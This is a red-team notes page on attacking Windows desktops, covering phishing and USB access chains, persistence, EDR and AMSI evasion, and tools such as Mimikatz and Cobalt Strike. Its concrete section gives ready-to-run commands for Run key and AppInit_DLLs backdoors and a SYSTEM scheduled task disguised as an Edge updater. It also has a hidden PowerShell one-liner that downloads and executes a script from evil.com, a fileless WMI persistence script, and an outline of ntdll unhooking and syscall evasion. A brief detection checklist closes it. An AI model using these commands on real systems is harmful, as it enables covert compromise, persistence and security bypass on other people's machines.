---
title: Attack Perspective — Desktop Security (Red Team)
tags:
- attack
- red-team
- desktop
- os
- persistence
- evasion
- hardening-bypass
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# Desktop Security — Perspektif Penyerang

> Desktop = titik awal paling umum (phishing → user). Red team: initial access, persistence, defense evasion, credential access — semua di level endpoint.

## 1. Attack Surface Desktop

| Komponen | Vektor | MITRE ID | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|----------|---------------|---------|----------------|
| **Phishing** | Email/attachment → payload | T1566 | Macro, HTML, LINK | User = weakest link | Email gateway = partial |
| **Browser** | Drive-by, extension abuse | T1189 | Exploit kit, malicious ext | User install | Browser sandbox = partial |
| **USB** | Auto-run, BadUSB | T1091 | Rubber Ducky, USB drop | Physical | USB policy = partial |
| **Persistence** | Registry, task, WMI, COM | T1543/T1546 | SharpStay, custom | WMI = legit | WMI audit = rare |
| **Credential** | LSASS, browser store, DPAPI | T1003 | Mimikatz, SharpDPAPI | Custom build | PPL = partial |
| **Defense Evasion** | AMSI patch, ETW kill, LOLBin | T1562 | Custom, certutil | Direct syscall | EDR hook = partial |
| **Lateral** | SMB, RDP, WinRM | T1021 | PsExec, evil-winrm | Legit protocol | Connection audit = rare |

## 2. Initial Access Chain

```
Phishing:
  ├── Email → macro/HTML (DONUT → shellcode)
  ├── Email → LINK (Evilginx → credential + session)
  ├── Email → attachment (malicious doc)
  └→ User opens → payload → beacon
    ↓
Drive-by:
  ├── Compromised site → exploit kit (browser)
  ├── Malicious ad → redirect → exploit
  └→ Sandbox escape → payload
    ↓
USB:
  ├── Rubber Ducky → keystroke inject → payload
  ├── BadUSB → HID attack → command
  └→ Drop USB → user curiosity → execute
    ↓
Result: User context → beacon → C2 → escalation
```

## 3. Persistence Methods

| Method | MITRE ID | Detection |
|--------|----------|-----------|
| Registry Run key | T1547.001 | Autoruns |
| Scheduled Task | T1053.005 | Task Scheduler audit |
| WMI Event Subscription | T1546.003 | WMI audit (rare) |
| COM Hijack | T1546.015 | Registry audit |
| DLL Search Order | T1574.001 | ProcMon |
| Service | T1543.003 | Service audit |
| Startup Folder | T1547.001 | Folder audit |
| Image File Options | T1546.012 | Registry audit |

## 4. Evasion Techniques

| Defender Control | Bypass | Tool |
|------------------|--------|------|
| AMSI | Patch AmsiScanBuffer | Custom |
| ETW | Patch EtwEventWrite | Custom |
| EDR hook | Direct syscall | SysWhispers3 |
| AppLocker | LOLBin, bypass technique | certutil, mshta |
| Defender | Custom packer, string encrypt | Custom |
| SmartScreen | Signed binary, mark-of-web bypass | Custom |

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Evilginx2** | AiTM phishing |
| **DONUT** | In-memory loader |
| **Mimikatz** | Credential access |
| **SharpStay** | Persistence |
| **SysWhispers3** | Direct syscall |
| **Cobalt Strike / Sliver** | C2 |

## 6. Referensi
- LOLBAS — https://lolbas-project.github.io/
- MITRE T1543 — https://attack.mitre.org/techniques/T1543/
- Persistence Research — https://www.ired.team/offensive-security/persistence
- EDR Evasion — https://www.mdsec.co.uk/research/

## Konkret — Desktop Persist & Bypass (Testable)

### Registry Persistence

```powershell
# Run key (most common / blue team tahu)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# Less-known: AppInit_DLLs (inject ke semua process)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

### Scheduled Task (stealth persistence)

```powershell
# Trigger saat user logon, tidak terlihat di Task Scheduler UI bila diatur ini:
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "powershell.exe -WindowStyle Hidden -Command C:\backdoor.exe" /sc onlogon /ru SYSTEM

# PowerShell one-liner (bypass execution policy)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
```

### WMI Event Subscription (fileless)

```powershell
# Filter: trigger saat logon
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "LogonFilter"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

# Consumer: jalankan command
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "LogonConsumer"
    CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX(...)"
}

# Binding
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
# Detection: Sysmon EID 19/20/21 (WMI filter/consumer/binding)
```

### EDR Bypass (Direct Syscalls + unhooking)

```c
// 1. Dapatkan syscalls stub secara manual (tidak lewat ntdll.dll)
//    resolve dari ntdll.dll, extract syscall number, call direct di assembly

// 2. Unhooking: replace hooked ntdll.dll di memori dengan clean copy
//    read C:\Windows\System32\ntdll.dll dari disk → overwrite memory section

// 3. Sleep obfuscation: encrypt shellcode selama inaktif
//    Decrypt hanya saat eksekusi (memori thread)
//    Hasil: memory scan tidak menemukan shellcode saat idle

// SysWhispers3 (C)
#include "syscalls.h"
// Direct syscalls NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.
```

### Def check

1. Run key, AppInit_DLLs, Scheduled Task, WMI subscription — audit all
2. Sysmon EID 19/20/21 — WMI events
3. Sysmon EID 11 — file create (backdoor exe)
4. ETW Threat Intelligence — callback detection
5. AMSI bypass (-ExecutionPolicy bypass tidak cukup)
---

audited
---
